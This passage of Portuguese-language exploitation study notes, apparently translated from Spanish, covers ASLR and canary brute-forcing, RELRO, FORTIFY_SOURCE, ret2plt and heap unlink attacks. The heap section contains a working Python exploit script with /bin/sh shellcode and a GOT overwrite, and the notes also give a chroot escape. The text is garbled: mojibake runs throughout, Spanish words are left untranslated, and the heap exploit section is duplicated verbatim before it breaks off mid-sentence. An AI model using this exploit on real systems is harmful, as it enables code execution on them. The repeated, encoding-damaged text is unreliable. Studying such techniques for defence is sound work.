Mem√≥ria alocada por mmap() e bibliotecas compartilhadas ‚Äî> 16 bits, delta\_mmap

O stack ‚Äî> 24 bits, delta\_stack ‚Äî> Realmente 11 (do byte 10¬∫ ao 20¬∫ inclusive) ‚Äî> alinhado a 16 bytes ‚Äî> 524.288 poss√≠veis endere√ßos reais do stack

As vari√°veis de ambiente e os argumentos se deslocam menos que um buffer no stack.

**Return-into-printf**

√â uma t√©cnica para transformar um estouro de buffer em um erro de formata√ß√£o de string. Consiste em substituir o EIP para apontar para um printf da fun√ß√£o e passar uma string de formato manipulada como argumento para obter valores sobre o estado do processo.

**Ataque a bibliotecas**

As bibliotecas est√£o em uma posi√ß√£o com 16 bits de aleatoriedade = 65636 poss√≠veis endere√ßos. Se um servidor vulner√°vel chamar fork(), o espa√ßo de endere√ßamento de mem√≥ria √© clonado no processo filho e permanece intacto. Portanto, pode-se tentar fazer uma for√ßa bruta na fun√ß√£o usleep() da libc passando "16" como argumento, de modo que quando demorar mais do que o normal para responder, a fun√ß√£o ser√° encontrada. Sabendo onde est√° essa fun√ß√£o, pode-se obter delta\_mmap e calcular as demais.

A √∫nica maneira de ter certeza de que o ASLR funciona √© usando uma arquitetura de 64 bits. N√£o h√° ataques de for√ßa bruta l√°.

**StackGuard e StackShield**

**StackGuard** insere antes do EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Continuam vulner√°veis recv(), memcpy(), read(), bcopy() e n√£o protege o EBP

**StackShield** √© mais elaborado que o StackGuard

Ele armazena em uma tabela (Global Return Stack) todos os endere√ßos EIP de retorno para que o estouro de buffer n√£o cause nenhum dano. Al√©m disso, os dois endere√ßos podem ser comparados para verificar se houve um estouro.

Tamb√©m √© poss√≠vel verificar o endere√ßo de retorno com um valor limite, ent√£o se o EIP for para um local diferente do habitual, como o espa√ßo de dados, ser√° detectado. Mas isso pode ser contornado com Ret-to-lib, ROPs ou ret2ret.

Como pode ser visto, o stackshield tamb√©m n√£o protege as vari√°veis locais.

**Stack Smash Protector (ProPolice) -fstack-protector**

Coloca o can√°rio antes do EBP. Reorganiza as vari√°veis locais para que os buffers estejam nas posi√ß√µes mais altas e, assim, n√£o possam sobrescrever outras vari√°veis.

Al√©m disso, faz uma c√≥pia segura dos argumentos passados acima da pilha (acima das vars locais) e usa essas c√≥pias como argumentos.

N√£o pode proteger arrays com menos de 8 elementos ou buffers que fa√ßam parte de uma estrutura do usu√°rio.

O can√°rio √© um n√∫mero aleat√≥rio retirado de "/dev/urandom" ou sen√£o √© 0xff0a0000. √â armazenado em TLS (Thread Local Storage). Os threads compartilham o mesmo espa√ßo de mem√≥ria, o TLS √© uma √°rea que tem vari√°veis globais ou est√°ticas de cada thread. No entanto, em princ√≠pio, essas s√£o copiadas do processo pai, embora o processo filho possa modificar esses dados sem modificar os do pai ou dos outros filhos. O problema √© que se usar fork() mas n√£o criar um novo can√°rio, ent√£o todos os processos (pai e filhos) usar√£o o mesmo can√°rio. No i386, √© armazenado em gs:0x14 e no x86\_64, √© armazenado em fs:0x28

Essa prote√ß√£o localiza fun√ß√µes que tenham buffers que possam ser atacados e inclui no in√≠cio da fun√ß√£o c√≥digo para colocar o can√°rio e no final para verific√°-lo.

A fun√ß√£o fork() faz uma c√≥pia exata do processo pai, por isso, se um servidor web chamar fork(), pode-se fazer um ataque de for√ßa bruta byte a byte at√© descobrir o can√°rio que est√° sendo usado.

Se usar a fun√ß√£o execve() ap√≥s fork(), o espa√ßo √© sobrescrito e o ataque n√£o √© mais poss√≠vel. vfork() permite executar o processo filho sem criar um duplicado at√© que o processo filho tente escrever, ent√£o cria o duplicado.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** afeta as permiss√µes de mem√≥ria de forma semelhante ao NX. A diferen√ßa √© que, enquanto com o NX torna a pilha execut√°vel, o RELRO torna **certas coisas somente leitura** para que n√£o possamos escrever nelas. A maneira mais comum que vi isso ser um obst√°culo √© nos impedindo de fazer uma **sobrescrita da tabela `got`**, que ser√° abordada posteriormente. A tabela `got` cont√©m endere√ßos de fun√ß√µes libc para que o bin√°rio saiba quais s√£o os endere√ßos e possa cham√°-los. Vamos ver como s√£o as permiss√µes de mem√≥ria para uma entrada da tabela `got` para um bin√°rio com e sem relro.

Com relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sem relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para o bin√°rio **sem relro**, podemos ver que o endere√ßo de entrada `got` para `fgets` √© `0x404018`. Ao analisar os mapeamentos de mem√≥ria, vemos que ele est√° entre `0x404000` e `0x405000`, que tem as **permiss√µes `rw`**, significando que podemos ler e escrever nele. Para o bin√°rio **com relro**, vemos que o endere√ßo da tabela `got` para a execu√ß√£o do bin√°rio (o pie est√° ativado, ent√£o este endere√ßo ir√° mudar) √© `0x555555557fd0`. Nos mapeamentos de mem√≥ria desse bin√°rio, ele est√° entre `0x0000555555557000` e `0x0000555555558000`, que tem a permiss√£o de mem√≥ria **`r`**, significando que s√≥ podemos ler dele.

Ent√£o, qual √© o **bypass**? O bypass t√≠pico que eu uso √© simplesmente n√£o escrever em regi√µes de mem√≥ria que o relro faz ser somente leitura, e **encontrar uma maneira diferente de obter a execu√ß√£o de c√≥digo**.

Observe que para isso acontecer, o bin√°rio precisa saber antes da execu√ß√£o os endere√ßos das fun√ß√µes:

* Lazy binding: O endere√ßo de uma fun√ß√£o √© procurado na primeira vez que a fun√ß√£o √© chamada. Portanto, o GOT precisa ter permiss√µes de escrita durante a execu√ß√£o.
* Bind now: Os endere√ßos das fun√ß√µes s√£o resolvidos no in√≠cio da execu√ß√£o, ent√£o permiss√µes somente leitura s√£o dadas a se√ß√µes sens√≠veis como .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar se um programa usa Bind now, voc√™ pode fazer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando o bin√°rio √© carregado na mem√≥ria e uma fun√ß√£o √© chamada pela primeira vez, ele salta para a PLT (Procedure Linkage Table), a partir da√≠ ele faz um salto (jmp) para a GOT e descobre que essa entrada n√£o foi resolvida (cont√©m um endere√ßo seguinte da PLT). Ent√£o ele invoca o Runtime Linker ou rtfd para resolver o endere√ßo e salv√°-lo na GOT.

Quando uma fun√ß√£o √© chamada, ela chama a PLT, que tem o endere√ßo da GOT onde o endere√ßo da fun√ß√£o √© armazenado, redirecionando o fluxo para l√° e assim chamando a fun√ß√£o. No entanto, se for a primeira vez que a fun√ß√£o √© chamada, o que est√° na GOT √© a pr√≥xima instru√ß√£o da PLT, ent√£o o fluxo segue o c√≥digo da PLT (rtfd) e descobre o endere√ßo da fun√ß√£o, salva na GOT e chama.

Ao carregar um bin√°rio na mem√≥ria, o compilador informa em qual offset os dados que devem ser carregados quando o programa √© executado devem ser colocados.

Lazy binding ‚Äî> O endere√ßo da fun√ß√£o √© procurado apenas na primeira vez que a fun√ß√£o √© chamada, ent√£o a GOT tem permiss√µes de escrita para que, quando for procurado, seja salvo l√° e n√£o precise ser procurado novamente.

Bind now ‚Äî> Os endere√ßos das fun√ß√µes s√£o procurados ao carregar o programa e as permiss√µes das se√ß√µes .got, .dtors, .ctors, .dynamic, .jcr s√£o alteradas para somente leitura. **-z relro** e **-z now**

Apesar disso, em geral os programas n√£o s√£o complicados com essas op√ß√µes, ent√£o esses ataques continuam sendo poss√≠veis.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Para verificar se usam o BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ou =2**

Tenta identificar fun√ß√µes que copiam de um lugar para outro de forma insegura e substituir a fun√ß√£o por uma fun√ß√£o segura.

Por exemplo:\
char buf\[16];\
strcpy(but, source);

Identifica como inseguro e ent√£o substitui strcpy() por \_\_strcpy\_chk() usando o tamanho do buffer como tamanho m√°ximo a ser copiado.

A diferen√ßa entre **=1** ou **=2** √© que:

O segundo n√£o permite que **%n** venha de uma se√ß√£o com permiss√µes de escrita. Al√©m disso, o par√¢metro para acesso direto de argumentos s√≥ pode ser usado se os anteriores forem usados, ou seja, s√≥ pode ser usado **%3$d** se antes tiver sido usado **%2$d** e **%1$d**

Para mostrar a mensagem de erro, √© usado o argv\[0\], ent√£o se for colocado l√° o endere√ßo de outro local (como uma vari√°vel global), a mensagem de erro mostrar√° o conte√∫do dessa vari√°vel. P√°gina 191

**Substitui√ß√£o do Libsafe**

Ativado com: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Intercepta chamadas a algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para sempre ter um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que se chame a fun√ß√£o strcpy@plt (da plt) e se aponte para a entrada da GOT e se copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, faz-se o mesmo apontando para GOT+1 e copiando o segundo byte de system()... No final, chama-se o endere√ßo armazenado na GOT que ser√° system()

**Falso EBP**

Para fun√ß√µes que usam o EBP como registro para apontar para os argumentos ao modificar o EIP e apontar para system(), tamb√©m √© necess√°rio modificar o EBP para apontar para uma √°rea de mem√≥ria que tenha 2 bytes quaisquer e, em seguida, o endere√ßo para &‚Äù/bin/sh‚Äù.

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de c√≥digo**

Valgrind ‚Äî> Busca erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev\_size |\
size | ‚ÄîCabe√ßalho\
\*mem | Dados

**Trozo livre**

prev\_size |\
size |\
\*fd | Ptr para o pr√≥ximo tro√ßo\
\*bk | Ptr para o tro√ßo anterior ‚ÄîCabe√ßalho\
\*mem | Dados

Os tro√ßos livres est√£o em uma lista duplamente encadeada (bin) e nunca podem haver dois tro√ßos livres juntos (eles s√£o unidos)

Em ‚Äúsize‚Äù h√° bits para indicar: Se o tro√ßo anterior est√° em uso, se o tro√ßo foi alocado por meio de mmap() e se o tro√ßo pertence √† arena prim√°ria.

Ao liberar um tro√ßo, se algum dos cont√≠guos estiver livre, eles s√£o fundidos pela macro unlink() e o novo tro√ßo maior √© passado para frontlink() para ser inserido no bin apropriado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo tro√ßo √© o que o tro√ßo livre anterior tinha\
FD = P->fd; ‚Äî> O FD do novo tro√ßo √© o que o tro√ßo livre anterior tinha\
FD->bk = BK; ‚Äî> O BK do tro√ßo seguinte aponta para o novo tro√ßo\
BK->fd = FD; ‚Äî> O FD do tro√ßo anterior aponta para o novo tro√ßo\
}

Portanto, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, ao sair do programa, a shellcode ser√° executada.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e a shellcode precisa ser ajustada para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso provoca a escrita de 4 bytes a partir do 8¬∫ byte da shellcode, ent√£o a primeira instru√ß√£o da shellcode deve ser um jmp para pular isso e chegar a uns nops que levam ao restante da shellcode.

Portanto, o exploit √© criado:

No buffer1, inserimos a shellcode come√ßando por um jmp para que caia nos nops ou no restante da shellcode.

Depois da shellcode, inserimos preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo tro√ßo. Nestes locais, inserimos 0xfffffff0 (para sobrescrever o prev\_size para que tenha o bit que indica que est√° livre) e ‚Äú-4‚Äù (0xfffffffc) no size (para que, ao verificar no 3¬∫ tro√ßo se o 2¬∫ estava livre, na verdade v√° para o prev\_size modificado que dir√° que est√° livre) -> Assim, quando o free() investigar, ele ir√° para o size do 3¬∫, mas na verdade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ tro√ßo est√° livre. Ent√£o chamar√° o **unlink()**.

Ao chamar unlink(), ele usar√° os primeiros dados do 2¬∫ tro√ßo como P->fd, ent√£o √© a√≠ que ser√° inserido o endere√ßo a ser sobrescrito - 12 (pois em FD->bk ele somar√° 12 ao endere√ßo armazenado em FD). E nesse endere√ßo, ser√° inserido o segundo endere√ßo encontrado no 2¬∫ tro√ßo, que ser√° o endere√ßo da shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de preenchimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interessa que o bit que indica que o tro√ßo anterior est√° livre esteja em 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o ‚Äúsize‚Äù do 3¬∫ tro√ßo est√° 4bytes atr√°s (aponta para prev\_size) pois √© a√≠ que ele verifica se o 2¬∫ tro√ßo est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload, no in√≠cio, vamos colocar 8bytes de preenchimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° o endere√ßo que ser√° sobrescrito para que a shellcode seja executada na 2¬™ vez que free() for chamado)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como mencionado, o payload come√ßa com 8 bytes de preenchimento porque sim**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #O 2¬∫ tro√ßo √© modificado, o got\_free aponta para onde vamos salvar o endere√ßo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 tro√ßos consecutivos e eles s√£o liberados na ordem inversa √† reserva.

Nesse caso:

No tro√ßo c, colocamos a shellcode

No tro√ßo a, usamos para sobrescrever o b de forma que o size tenha o bit PREV\_INUSE desativado para que pense que o tro√ßo a est√° livre.

Al√©m disso, sobrescrevemos no cabe√ßalho b o size para que seja -4.

Ent√£o, o programa pensar√° que ‚Äúa‚Äù est√° livre e em um bin, ent√£o chamar√° unlink() para desvincul√°-lo. No entanto, como o cabe√ßalho PREV\_SIZE vale -4, ele pensar√° que o tro√ßo ‚Äúa‚Äù realmente come√ßa em b+4. Ou seja, far√° um unlink() para um tro√ßo que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro ‚Äúfd‚Äù e em b+16 estar√° o ponteiro ‚Äúbk‚Äù.

Dessa forma, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, ao sair do programa, a shellcode ser√° executada.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e a shellcode precisa ser ajustada para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso provoca a escrita de 4 bytes a partir do 8¬∫ byte da shellcode, ent√£o a primeira instru√ß√£o da shellcode deve ser um jmp para pular isso e chegar a uns nops que levam ao restante da shellcode.

Portanto, o exploit √© criado:

No buffer1, inserimos a shellcode come√ßando por um jmp para que caia nos nops ou no restante da shellcode.

Depois da shellcode, inserimos preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo tro√ßo. Nestes locais, inserimos 0xfffffff0 (para sobrescrever o prev\_size para que tenha o bit que indica que est√° livre) e ‚Äú-4‚Äù (0xfffffffc) no size (para que, ao verificar no 3¬∫ tro√ßo se o 2¬∫ estava livre, na verdade v√° para o prev\_size modificado que dir√° que est√° livre) -> Assim, quando o free() investigar, ele ir√° para o size do 3¬∫, mas na verdade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ tro√ßo est√° livre. Ent√£o chamar√° o **unlink()**.

Ao chamar unlink(), ele usar√° os primeiros dados do 2¬∫ tro√ßo como P->fd, ent√£o √© a√≠ que ser√° inserido o endere√ßo a ser sobrescrito - 12 (pois em FD->bk ele somar√° 12 ao endere√ßo armazenado em FD). E nesse endere√ßo, ser√° inserido o segundo endere√ßo encontrado no 2¬∫ tro√ßo, que ser√° o endere√ßo da shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de preenchimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interessa que o bit que indica que o tro√ßo anterior est√° livre esteja em 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o ‚Äúsize‚Äù do 3¬∫ tro√ßo est√° 4bytes atr√°s (aponta para prev\_size) pois √© a√≠ que ele verifica se o 2¬∫ tro√ßo est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload, no in√≠cio, vamos colocar 8bytes de preenchimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° o endere√ßo que ser√° sobrescrito para que a shellcode seja executada na 2¬™ vez que free() for chamado)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como mencionado, o payload come√ßa com 8 bytes de preenchimento porque sim**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #O 2¬∫ tro√ßo √© modificado, o got\_free aponta para onde vamos salvar o endere√ßo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 tro√ßos consecutivos e eles s√£o liberados na ordem inversa √† reserva.

Nesse caso:

No tro√ßo c, colocamos a shellcode

No tro√ßo a, usamos para sobrescrever o b de forma que o size tenha o bit PREV\_INUSE desativado para que pense que o tro√ßo a est√° livre.

Al√©m disso, sobrescrevemos no cabe√ßalho b o size para que valha -4.

Ent√£o, o programa pensar√° que ‚Äúa‚Äù est√° livre e em um bin, ent√£o chamar√° unlink() para desvincul√°-lo. No entanto, como o cabe√ßalho PREV\_SIZE vale -4, ele pensar√° que o tro√ßo ‚Äúa‚Äù realmente come√ßa em b+4. Ou seja, far√° um unlink() para um tro√ßo que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro ‚Äúfd‚Äù e em b+16 estar√° o ponteiro ‚Äúbk‚Äù.

Dessa forma, se conseguirmos modificar o P->bk com o endere√ßo de um shellcode e o P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, ao sair do programa, a shellcode ser√° executada.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e a shellcode precisa ser ajustada para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso provoca a escrita de 4 bytes a partir
